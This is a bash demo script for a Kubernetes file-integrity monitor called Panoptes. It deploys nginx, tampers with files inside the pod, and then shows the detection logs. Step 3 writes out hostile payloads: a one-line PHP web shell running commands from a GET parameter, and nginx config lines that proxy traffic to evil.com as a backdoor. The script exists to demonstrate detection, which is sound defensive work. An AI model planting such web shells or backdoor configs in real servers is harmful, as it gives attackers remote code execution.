#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NAMESPACE="default"
PANOPTES_NS="panoptes-system"

# ─── Colors ──────────────────────────────────────────────────────────
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[INFO]${NC}  $*"; }
ok()    { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
step()  { echo -e "\n${GREEN}=== $* ===${NC}\n"; }

# ─── Cleanup ─────────────────────────────────────────────────────────
cleanup() {
    step "Cleaning up runtime FIM demo resources"

    info "Deleting nginx deployment and ArgusWatcher..."
    kubectl delete -f "${SCRIPT_DIR}/nginx-monitored.yaml" --ignore-not-found -n "${NAMESPACE}"

    ok "Cleanup complete."
    echo -e "${YELLOW}Note:${NC} Panoptes itself was not uninstalled. Run 'helm uninstall panoptes -n ${PANOPTES_NS}' to remove it."
}

if [[ "${1:-}" == "--cleanup" ]]; then
    cleanup
    exit 0
fi

# ─── Pre-flight check ───────────────────────────────────────────────
step "Pre-flight: Checking Panoptes installation"

if ! kubectl get namespace "${PANOPTES_NS}" &>/dev/null; then
    warn "Panoptes namespace '${PANOPTES_NS}' not found."
    info "Installing Panoptes..."
    helm install panoptes oci://ghcr.io/como-technologies/charts/panoptes \
        -n "${PANOPTES_NS}" --create-namespace \
        --wait --timeout 120s
    ok "Panoptes installed."
else
    ok "Panoptes namespace exists."
fi

info "Waiting for argusd to be ready..."
kubectl wait --for=condition=ready pod -l app=argusd -n "${PANOPTES_NS}" --timeout=120s
ok "argusd is running."

# ─── Step 1: Deploy nginx with monitoring ────────────────────────────
step "Step 1/4: Deploying nginx with ArgusWatcher"

kubectl apply -f "${SCRIPT_DIR}/nginx-monitored.yaml" -n "${NAMESPACE}"

info "Waiting for nginx-monitored to be ready..."
kubectl wait --for=condition=available deploy/nginx-monitored -n "${NAMESPACE}" --timeout=120s
ok "nginx-monitored is running."

POD=$(kubectl get pods -l app=nginx-monitored -n "${NAMESPACE}" -o jsonpath='{.items[0].metadata.name}')
info "Monitored pod: ${POD}"

# ─── Step 2: Verify monitoring ──────────────────────────────────────
step "Step 2/4: Verifying ArgusWatcher is active"

info "Waiting 5 seconds for kernel watches to initialize..."
sleep 5

kubectl get aw nginx-fim -n "${NAMESPACE}" -o wide 2>/dev/null || warn "ArgusWatcher not yet visible"

info "Current nginx.conf content (first 5 lines):"
kubectl exec "${POD}" -n "${NAMESPACE}" -- head -5 /etc/nginx/nginx.conf

info "Current index.html:"
kubectl exec "${POD}" -n "${NAMESPACE}" -- cat /usr/share/nginx/html/index.html | head -5

# ─── Step 3: Simulate violations ────────────────────────────────────
step "Step 3/4: Simulating file integrity violations"

info "Violation 1: Modifying nginx.conf (config tampering)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '# injected by attacker: proxy_pass http://evil.com;' >> /etc/nginx/nginx.conf"
ok "Modified /etc/nginx/nginx.conf"

sleep 2

info "Violation 2: Defacing index.html (web content modification)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '<html><body><h1>DEFACED BY ATTACKER</h1></body></html>' > /usr/share/nginx/html/index.html"
ok "Modified /usr/share/nginx/html/index.html"

sleep 2

info "Violation 3: Creating a new file in nginx config directory"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo 'location /backdoor { proxy_pass http://evil.com; }' > /etc/nginx/conf.d/backdoor.conf"
ok "Created /etc/nginx/conf.d/backdoor.conf"

sleep 2

info "Violation 4: Creating a web shell in content directory"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /usr/share/nginx/html/shell.php"
ok "Created /usr/share/nginx/html/shell.php"

# ─── Step 4: Show detections ────────────────────────────────────────
step "Step 4/4: Showing detected events"

info "Waiting 3 seconds for events to propagate..."
sleep 3

info "ArgusWatcher status:"
kubectl get aw nginx-fim -n "${NAMESPACE}" -o wide 2>/dev/null || true

echo ""
info "argusd daemon logs (last 25 lines):"
kubectl logs -n "${PANOPTES_NS}" -l app=argusd --tail=25 2>/dev/null || warn "Could not retrieve argusd logs"

echo ""
info "Argus operator logs (last 15 lines):"
kubectl logs -n "${PANOPTES_NS}" -l app=argus-operator --tail=15 2>/dev/null || warn "Could not retrieve argus-operator logs"

# ─── Done ────────────────────────────────────────────────────────────
step "Demo complete"

echo -e "
${GREEN}What happened:${NC}
  1. Deployed nginx with an ArgusWatcher monitoring /etc/nginx and /usr/share/nginx/html
  2. The ArgusWatcher registered kernel inotify watches on the container filesystem
  3. We simulated 4 violations:
     - Config tampering    (modified nginx.conf)
     - Content defacement  (overwrote index.html)
     - Backdoor config     (created backdoor.conf)
     - Web shell upload    (created shell.php)
  4. All violations were detected in real-time by the kernel

${GREEN}Key takeaway:${NC}
  Container filesystems should be immutable at runtime.
  Any modification is suspicious and warrants investigation.

${YELLOW}To clean up:${NC}
  ${SCRIPT_DIR}/demo.sh --cleanup
"
